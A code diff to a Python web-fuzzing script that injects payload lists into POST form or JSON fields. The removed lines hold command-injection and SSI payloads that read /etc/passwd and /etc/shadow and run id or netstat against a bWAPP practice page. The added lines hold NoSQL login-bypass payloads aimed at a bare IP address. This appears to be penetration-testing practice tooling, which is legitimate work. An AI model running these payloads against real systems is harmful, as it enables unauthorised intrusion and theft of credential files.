@@ -6,7 +6,7 @@ from .parse import postParser
 from urllib.parse import quote as requote_uri
 from bs4 import BeautifulSoup as bs4
 import re
-
+from typing import List
 
 URL = "https://bwapp.hakhub.net/login.php"
 
@@ -64,20 +64,24 @@ def post_validation(url: str, type_attack: str, login_dvwa: bool = False):
 
 # post request -> url, payloads, data (x-urlformencoded)
 
-def post_request(url: str, payloads: list, data: dict, login_dvwa: bool = False):
+def post_request(url: str, payloads: list, data: dict, login_dvwa: bool = False, json_encode: bool = False) -> List[List]:
     if (login_dvwa):
         session = createSessionBwapp(URL)
     else:
         session = requests
     current_data = data.copy()
-    headers = {"Content-Type": "application/x-www-form-urlencoded"}
+    if (json_encode):
+        content_type = "application/json"
+    else:
+        content_type = "application/x-www-form-urlencoded"
+    headers = {"Content-Type": content_type}
     for key, value in data.items():
         if (re.search("\$(.*?)\$", value) != None):
             v = postParser(value, payloads)
             current_data[key] = v
     processed_data = []
     for key, value in current_data.items():
-        if (len(value) > 1 and isinstance(value, list)):
+        if (len(value) > 1 and isinstance(value, list)): 
             for item in value:
                 initial_data = data.copy()
                 initial_data[key] = item
@@ -85,7 +89,10 @@ def post_request(url: str, payloads: list, data: dict, login_dvwa: bool = False)
     
     result = []
     for index, value_dict in enumerate(processed_data):
-        response = session.post(url, data = value_dict, headers=headers)
+        if (json_encode):
+            response = session.post(url, json = value_dict, headers=headers)
+        else:
+            response = session.post(url, data = value_dict, headers=headers)
         status_code = response.status_code
         try:
             content_length = response.headers["Content-Length"]
@@ -100,16 +107,8 @@ def post_request(url: str, payloads: list, data: dict, login_dvwa: bool = False)
 
 if __name__ == "__main__":
     payload = """
-    cat /etc/passwd
-    &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
-    &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
-    &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
-    /index.html|id|
-    ;id;
-    ;id
-    ;netstat -a;
-    ;system('cat%20/etc/passwd')
-    ;id;
+    {"$ne": "foo"}
+    {"$where":  "return true"}
     """.split("\n")
-    response = post_request("https://bwapp.hakhub.net/commandi.php", payload, {"target": "www.nsa.gov $$"}, login_dvwa=True)
-    print(response)
+    response = post_request(url="http://47.245.99.142/nosql1", payloads=payload, data={"username": "$$", "password": "$$"}, login_dvwa=False, json_encode = True)
+    print(response) 
